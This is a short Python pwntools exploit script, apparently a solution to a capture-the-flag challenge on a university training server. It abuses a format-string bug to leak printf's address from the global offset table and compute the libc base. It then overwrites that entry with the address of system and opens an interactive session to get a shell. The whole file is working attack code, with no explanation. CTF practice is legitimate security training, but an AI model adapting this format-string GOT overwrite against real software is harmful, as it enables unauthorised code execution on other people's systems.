from pwn import * 

# p = process("./bin", env={"LD_PRELOAD": "./libc.so.6"})
# p = gdb.debug(
#     "./bin",
#     """
#     break main
#     continue
#     """,
#     env={"LD_PRELOAD": "./libc.so.6"}
#     )
p = remote('cyberchallenge.disi.unitn.it', 50230)

def little_to_big_endian(hex_str):
    hex_pairs = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]
    hex_pairs.reverse()
    big_endian_str = ''.join(hex_pairs)
    return big_endian_str

elf = ELF("./bin")
libc = ELF("./libc.so.6")

context.binary = elf
#context(terminal=['tmux', 'splitw', '-h'])

printf_offset = libc.symbols["printf"]

p.sendlineafter(b"> ", b'%7$s    ' + p64(elf.got["printf"]))
printf_address = little_to_big_endian(p.recvuntil(b'> ').split(b' ')[0].hex())
libc_base = int(printf_address, 16) - printf_offset
libc.address = libc_base

system_address = hex(libc.symbols["system"])
printf_got_address = elf.got['printf']

system_pairs = [system_address[i:i+2] for i in range(0, len(system_address), 2)]
last_two_bytes_system = int(''.join(system_pairs[-2:]), 16)
print(last_two_bytes_system)

padding = 8 - ((7 + len(str(last_two_bytes_system))) % 8)
padding_payload = f'%{last_two_bytes_system}X%8$hn{'A'*padding}'.encode()
payload = padding_payload + p64(printf_got_address)

p.sendline(payload)
p.interactive()
